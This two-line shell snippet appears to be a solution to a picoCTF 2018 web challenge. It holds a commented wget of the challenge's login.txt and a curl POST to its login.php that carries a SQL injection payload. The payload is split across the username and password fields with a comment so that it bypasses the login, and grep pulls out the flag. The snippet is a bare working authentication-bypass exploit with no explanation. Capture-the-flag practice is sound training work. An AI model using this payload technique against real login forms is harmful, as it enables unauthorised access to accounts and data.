# wget http://2018shell1.picoctf.com:56537/login.txt

curl -s http://2018shell1.picoctf.com:56537/login.php --data "username=' /*&password=*/ or '1" | grep -o picoCTF{.*}
